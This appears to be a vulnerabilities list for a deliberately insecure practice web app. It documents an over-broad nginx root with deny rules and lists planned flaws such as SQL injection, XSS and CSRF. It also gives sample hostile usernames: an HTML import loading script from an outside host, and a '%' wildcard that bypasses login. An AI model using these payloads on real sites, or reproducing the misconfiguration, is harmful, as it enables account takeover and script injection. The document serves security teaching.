# Known vulnerabilities in this code

These are in no particular order.

## Web app problems


## Server configuration problems

### File access

The nginx configuration permits local file access because `root` is set too high and `try_files` is used. This is somewhat mitigated by `deny` directives for specific locations. The relevant portion of the file is as follows:

    root /vagrant;
    location / { try_files $uri @app; }
    location /setup/ { deny all; }
    location ~* vagrant { deny all; }
    location ~ \.db$ { deny all; }
    location ~ \.py$ { deny all; }
    location ~ (^|/)\. { deny all; }


## Planned vulnerabilities

* SQL injection
* XSS
* CSRF
* insecure direct object reference
* REST API without access control
* server misconfiguration
* salt reuse/MAC oracle


## Some interesting usernames

* `<link rel = "import" href = "https:&sol;&sol;mjec.net&sol;badscript.html`

  This injects `https://mjec.net/badscript.html` as HTML into the page. If that contains javascript, javascript runs. Requires appropriate CORS headers on the remote resource.

* `%`

  This logs you in as the first user with a password matching the password entered.
